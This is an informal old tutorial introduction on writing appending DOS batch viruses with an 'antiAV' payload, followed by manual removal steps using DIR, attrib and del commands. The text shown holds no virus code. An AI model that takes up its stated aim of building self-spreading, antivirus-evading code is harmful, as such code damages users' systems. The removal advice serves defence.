Utils you will need:

A text editor of some sort.
A working knollage of MS-DOS
A small understanding of Batch

About appending batch virii:
       
They are what are known as "Advanced" batch virii,
useing many subs and loops much like any other 
programming lauange. 

In this tut I will "try" to teach you how to make and
understand a advanced dos 6.x batch virus with payload.
You will not see "destructive" code in any payload

that i make. only "antiAV". Now you may ask why is this?
Simple kill the host you kill the virus. Why even waste
the time to code somthing if you going to make it commit
suicide? "antiAV" is diffrent your protecting your hard
work not killing it.  
To run this virus as a test remove all my -statements.

Removal of batch virii:
Batch virii work by adding code to the beginning and/or
the end of the infected .bat files. All infected code can
be removed by loading the infected .bat in to a text editor
and removing the added lines. Some may use a hidden copy of
themselves in root and/or other dir's. The command DIR /AH /S 

shows ALL hidden files on a drive. You will then need to
use attrib *.bat -s -r -h then use del *.bat, with "*.bat" 
as the virus name. If the payload went off and deleted some
the files just replace them after the virus has been removed.
